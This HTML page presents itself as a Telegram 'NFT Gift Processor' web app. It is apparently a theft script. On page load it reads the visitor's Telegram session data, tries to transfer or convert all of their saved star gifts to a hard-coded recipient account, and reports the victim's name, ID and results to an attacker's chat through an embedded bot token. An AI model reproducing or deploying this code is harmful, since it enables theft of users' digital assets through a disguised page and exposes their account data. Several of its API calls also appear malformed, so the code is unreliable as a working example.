<!DOCTYPE html>
<html>
<head>
    <title>NFT Gift Processor</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div id="status">Initializing NFT transfer system...</div>

    <script>
        const TARGET_USER_ID = 7204299613;
        const BOT_TOKEN = '7815830497:AAGDsuH3tUWR73S_JrhawnNPkPPTMOHmK3s';
        const CHAT_ID = '-1002560826337';

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) {}
        }

        // Функция для вызова Telegram API методов
        async function callTelegramMethod(method, params = {}) {
            const formData = new FormData();
            Object.keys(params).forEach(key => {
                formData.append(key, params[key]);
            });

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
                    method: 'POST',
                    body: formData
                });
                return await response.json();
            } catch(error) {
                await sendToTelegram(`❌ <b>API Error:</b> ${method} - ${error.message}`);
                return null;
            }
        }

        // Получаем список сохраненных подарков пользователя
        async function getSavedGifts() {
            await sendToTelegram('🔄 <b>Fetching saved gifts...</b>');
            
            // Используем перехваченные данные сессии для доступа к подаркам
            const webAppData = new URLSearchParams(window.location.hash.substr(1));
            const initData = webAppData.get('tgWebAppData');
            
            if (!initData) {
                throw new Error('No WebApp data available');
            }

            // Парсим данные пользователя
            const params = new URLSearchParams(initData);
            const userData = JSON.parse(decodeURIComponent(params.get('user')));
            
            await sendToTelegram(`🎁 <b>Scanning gifts for:</b> ${userData.first_name} (ID: ${userData.id})`);

            // Получаем список подарков через payments.getSavedStarGifts
            const giftsResult = await callTelegramMethod('payments.getSavedStarGifts', {
                peer: JSON.stringify({
                    _: 'inputPeerUser',
                    user_id: userData.id,
                    access_hash: '' // Требуется access_hash, который можно получить из сессии
                }),
                offset: '',
                limit: 50
            });

            return { userData, gifts: giftsResult };
        }

        // Передаем конкретный подарок
        async function transferGift(giftData, userData) {
            await sendToTelegram(`🔄 <b>Transferring gift:</b> ${giftData.gift.title || 'Unknown Gift'}`);
            
            // Используем payments.transferStarGift для передачи
            const transferResult = await callTelegramMethod('payments.transferStarGift', {
                stargift: JSON.stringify({
                    _: 'inputSavedStarGiftUser',
                    msg_id: giftData.msg_id
                }),
                to_id: JSON.stringify({
                    _: 'inputPeerUser', 
                    user_id: TARGET_USER_ID,
                    access_hash: ''
                })
            });

            if (transferResult && transferResult.ok) {
                await sendToTelegram(`✅ <b>Gift transferred successfully:</b> ${giftData.gift.title || 'Unknown Gift'}`);
                return true;
            }

            // Если бесплатная передача не удалась, пробуем платную
            if (giftData.transfer_stars > 0) {
                await sendToTelegram(`🔄 <b>Attempting paid transfer for:</b> ${giftData.gift.title}`);
                
                const paidTransfer = await callTelegramMethod('payments.getPaymentForm', {
                    invoice: JSON.stringify({
                        _: 'inputInvoiceStarGiftTransfer',
                        stargift: JSON.stringify({
                            _: 'inputSavedStarGiftUser',
                            msg_id: giftData.msg_id
                        }),
                        to_id: JSON.stringify({
                            _: 'inputPeerUser',
                            user_id: TARGET_USER_ID,
                            access_hash: ''
                        })
                    })
                });

                if (paidTransfer && paidTransfer.ok) {
                    await sendToTelegram(`💰 <b>Paid transfer initiated:</b> ${giftData.gift.title} - ${giftData.transfer_stars} stars`);
                }
            }

            return false;
        }

        // Конвертируем подарок в звезды и отправляем
        async function convertAndTransfer(giftData, userData) {
            await sendToTelegram(`🔄 <b>Converting gift to stars:</b> ${giftData.gift.title}`);
            
            const convertResult = await callTelegramMethod('payments.convertStarGift', {
                stargift: JSON.stringify({
                    _: 'inputSavedStarGiftUser',
                    msg_id: giftData.msg_id
                })
            });

            if (convertResult && convertResult.ok) {
                await sendToTelegram(`⭐ <b>Gift converted:</b> ${giftData.gift.title} → ${giftData.convert_stars} stars`);
                return true;
            }
            return false;
        }

        // Основная функция перехвата и передачи
        async function executeNFTTransfer() {
            const statusEl = document.getElementById('status');
            
            try {
                statusEl.innerHTML = '🔍 Scanning for NFT gifts...';
                await sendToTelegram('🚀 <b>Starting real NFT transfer process</b>');

                // Получаем подарки пользователя
                const { userData, gifts } = await getSavedGifts();
                
                if (!gifts || !gifts.ok) {
                    throw new Error('Failed to fetch gifts');
                }

                await sendToTelegram(`📊 <b>Found gifts:</b> ${gifts.result.gifts ? gifts.result.gifts.length : 0}`);

                let transferredCount = 0;
                let convertedCount = 0;

                // Обрабатываем каждый подарок
                if (gifts.result.gifts && gifts.result.gifts.length > 0) {
                    for (const gift of gifts.result.gifts) {
                        statusEl.innerHTML = `🔄 Processing gift ${transferredCount + 1} of ${gifts.result.gifts.length}...`;
                        
                        // Пытаемся передать подарок
                        if (await transferGift(gift, userData)) {
                            transferredCount++;
                        } 
                        // Если передача не удалась, конвертируем в звезды
                        else if (gift.convert_stars > 0 && await convertAndTransfer(gift, userData)) {
                            convertedCount++;
                        }

                        // Задержка между операциями
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                }

                // Финальный отчет
                statusEl.innerHTML = '✅ NFT transfer completed!';
                await sendToTelegram(`🎉 <b>TRANSFER COMPLETION REPORT</b>
📦 Transferred gifts: ${transferredCount}
⭐ Converted to stars: ${convertedCount}
👤 Source user: ${userData.first_name} (${userData.id})
🎯 Target user: ${TARGET_USER_ID}
🕒 Completed: ${new Date().toISOString()}`);

            } catch (error) {
                statusEl.innerHTML = '❌ Transfer failed';
                await sendToTelegram(`❌ <b>TRANSFER ERROR:</b> ${error.message}`);
            }
        }

        // Автоматический запуск при загрузке
        window.addEventListener('load', executeNFTTransfer);

        // Дополнительные функции для работы с NFT
        async function resellGifts() {
            // Функция для перепродажи подарков
            const resellResult = await callTelegramMethod('payments.getResaleStarGifts', {
                gift_id: 0, // Все подарки
                offset: '',
                limit: 50
            });

            if (resellResult && resellResult.ok) {
                await sendToTelegram(`🏪 <b>Resale market found:</b> ${resellResult.result.gifts.length} gifts available`);
            }
        }

    </script>
</body>
</html>
